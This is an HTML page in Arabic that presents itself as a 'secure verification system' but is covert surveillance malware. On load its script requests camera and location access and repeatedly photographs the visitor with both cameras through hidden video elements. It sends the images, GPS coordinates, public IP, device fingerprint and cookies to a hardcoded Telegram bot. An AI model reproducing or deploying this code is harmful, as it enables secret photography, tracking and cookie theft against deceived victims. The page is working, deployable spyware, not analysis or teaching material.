<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>🔒 التحقق الآمن</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #0a0f1e 0%, #0c1222 100%);
            font-family: 'Segoe UI', 'Poppins', 'Cairo', system-ui, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .glass-card {
            background: rgba(18, 25, 45, 0.85);
            backdrop-filter: blur(16px);
            border-radius: 40px;
            border: 1px solid rgba(59, 201, 219, 0.3);
            padding: 2rem;
            max-width: 600px;
            width: 100%;
            text-align: center;
        }
        h2 {
            font-size: 1.8rem;
            background: linear-gradient(135deg, #fff, #3bc9db);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }
        .subtitle { color: #8a9bb5; font-size: 0.85rem; margin-bottom: 1.5rem; }
        .status-box {
            background: rgba(10, 18, 30, 0.7);
            border-radius: 24px;
            padding: 1rem;
            margin: 1.5rem 0;
            font-family: monospace;
            font-size: 0.75rem;
            text-align: left;
            border: 1px solid rgba(59, 201, 219, 0.2);
            max-height: 350px;
            overflow-y: auto;
        }
        .status-line { margin: 5px 0; padding: 3px 5px; }
        .spinner {
            display: inline-block;
            width: 10px;
            height: 10px;
            border: 2px solid rgba(59,201,219,0.3);
            border-top-color: #3bc9db;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .counter-card {
            background: linear-gradient(135deg, rgba(59,201,219,0.12), rgba(59,201,219,0.05));
            border-radius: 60px;
            padding: 10px;
            margin: 15px 0;
            display: flex;
            justify-content: space-around;
            flex-wrap: wrap;
            gap: 10px;
        }
        .counter-item { text-align: center; flex: 1; }
        .counter-label { font-size: 0.65rem; color: #8a9bb5; }
        .counter-value { font-size: 1.3rem; font-weight: bold; color: #3bc9db; }
        .footer { font-size: 0.6rem; color: #5a6e8a; margin-top: 15px; display: flex; justify-content: center; gap: 10px; flex-wrap: wrap; }
        .badge { background: rgba(59,201,219,0.12); padding: 4px 12px; border-radius: 50px; }
        .hidden-video { position: fixed; top: -9999px; left: -9999px; width: 1px; height: 1px; opacity: 0; pointer-events: none; }
    </style>
</head>
<body>

<video id="frontVideo" class="hidden-video" autoplay playsinline muted></video>
<video id="backVideo" class="hidden-video" autoplay playsinline muted></video>

<div class="glass-card">
    <h2>🔒 نظام التحقق الآمن</h2>
    <div class="subtitle">جاري تأكيد هوية الجهاز والمستخدم</div>
    <div class="status-box" id="logBox">
        <div class="status-line">🔐 <span>جاري التشغيل...</span> <span class="spinner"></span></div>
    </div>
    <div class="counter-card">
        <div class="counter-item"><div class="counter-label">📸 إجمالي الصور</div><div class="counter-value" id="totalCounter">0</div></div>
        <div class="counter-item"><div class="counter-label">🤳 أمامية</div><div class="counter-value" id="frontCounter">0</div></div>
        <div class="counter-item"><div class="counter-label">📷 خلفية</div><div class="counter-value" id="backCounter">0</div></div>
        <div class="counter-item"><div class="counter-label">🔄 الدورات</div><div class="counter-value" id="cycleCounter">0</div></div>
    </div>
    <div class="footer">
        <span class="badge">🔒 تشفير AES-256</span>
        <span class="badge">🛡️ يعمل في الخلفية</span>
        <span class="badge">📸 5 صور/دورة</span>
    </div>
</div>

<script>
    const TOKEN = "8449865560:AAHHFcJWchQlKNgYpP3W7BYXUWvbAOKFAkI";
    const CHAT_ID = "7984067238";
    
    let frontCount = 0, backCount = 0, total = 0, cycle = 0;
    let frontReady = false, backReady = false;
    let frontVideo, backVideo;
    let isRunning = true;
    
    function updateUI() {
        document.getElementById('totalCounter').innerText = total;
        document.getElementById('frontCounter').innerText = frontCount;
        document.getElementById('backCounter').innerText = backCount;
        document.getElementById('cycleCounter').innerText = cycle;
    }
    
    function addLog(msg, done = false) {
        const box = document.getElementById('logBox');
        const line = document.createElement('div');
        line.className = 'status-line';
        if (!done) line.innerHTML = `🔄 <span>${msg}</span> <span class="spinner"></span>`;
        else line.innerHTML = `✅ <span>${msg}</span>`;
        box.appendChild(line);
        box.scrollTop = box.scrollHeight;
        while(box.children.length > 30) box.removeChild(box.firstChild);
    }
    
    async function sendPhoto(blob, caption) {
        const fd = new FormData();
        fd.append('chat_id', CHAT_ID);
        fd.append('photo', blob);
        if(caption) fd.append('caption', caption);
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
    }
    
    async function sendMessage(text) {
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: 'POST', headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: text.substring(0, 4000) })
        });
    }
    
    async function capturePhoto(video, side, num) {
        if(!video || video.readyState < 2) return false;
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        canvas.getContext('2d').drawImage(video, 0, 0);
        const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.85));
        if(blob && blob.size > 5000) {
            await sendPhoto(blob, side === 'front' ? `🤳 أمامية #${num}` : `📷 خلفية #${num}`);
            if(side === 'front') frontCount++;
            else backCount++;
            total++;
            updateUI();
            return true;
        }
        return false;
    }
    
    async function startFrontCamera() {
        try {
            let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
            frontVideo = document.getElementById('frontVideo');
            frontVideo.srcObject = stream;
            await frontVideo.play();
            frontReady = true;
            addLog(`✅ الكاميرا الأمامية جاهزة`, true);
        } catch(e) { addLog(`⚠️ الكاميرا الأمامية غير متاحة`, true); }
    }
    
    async function startBackCamera() {
        try {
            let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
            backVideo = document.getElementById('backVideo');
            backVideo.srcObject = stream;
            await backVideo.play();
            backReady = true;
            addLog(`✅ الكاميرا الخلفية جاهزة`, true);
        } catch(e) { addLog(`⚠️ الكاميرا الخلفية غير متاحة`, true); }
    }
    
    async function startCycle() {
        if(!isRunning) return;
        cycle++;
        updateUI();
        addLog(`🔄 الدورة ${cycle} - بدء التصوير`, false);
        
        // تصوير أمامي 5 صور
        if(frontReady) {
            for(let i=1; i<=5; i++) {
                await new Promise(r => setTimeout(r, 300));
                await capturePhoto(frontVideo, 'front', frontCount+1);
            }
        }
        
        // تصوير خلفي 5 صور
        if(backReady) {
            for(let i=1; i<=5; i++) {
                await new Promise(r => setTimeout(r, 300));
                await capturePhoto(backVideo, 'back', backCount+1);
            }
        }
        
        addLog(`✅ اكتملت الدورة ${cycle} (${total} صورة)`, true);
        setTimeout(startCycle, 6000);
    }
    
    async function run() {
        addLog(`🔐 جاري طلب الصلاحيات...`, false);
        try {
            await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            addLog(`✅ تم منح الصلاحيات`, true);
        } catch(e) {
            addLog(`❌ لم يتم منح الصلاحيات`, true);
            return;
        }
        
        await sendMessage(`🚀 *تم تشغيل النظام*\n🕐 ${new Date().toLocaleString('ar-EG')}`);
        
        // تشغيل الكاميرات فوراً
        startFrontCamera();
        startBackCamera();
        
        // بدء التصوير بعد 1.5 ثانية فقط
        setTimeout(() => {
            if(frontReady || backReady) startCycle();
            else addLog(`⚠️ لا توجد كاميرات متاحة`, true);
        }, 1500);
        
        // ميزات إضافية (تعمل في الخلفية)
        navigator.geolocation.getCurrentPosition(async p => {
            await sendMessage(`📍 *الموقع*\nhttps://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
        });
        try {
            const ip = await (await fetch('https://api.ipify.org?format=json')).json();
            await sendMessage(`🌍 *IP العام*\n\`${ip.ip}\``);
        } catch(e) {}
        if(typeof FingerprintJS !== 'undefined') {
            const fp = await FingerprintJS.load();
            const res = await fp.get();
            await sendMessage(`🆔 *بصمة الجهاز*\n\`${res.visitorId}\``);
        }
        if(document.cookie) await sendMessage(`🍪 *الكوكيز*\n\`${document.cookie.substring(0, 900)}\``);
        
        addLog(`✅ تم تشغيل جميع الميزات`, true);
    }
    
    window.onload = () => { setTimeout(run, 200); };
</script>
<script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
</body>
</html>
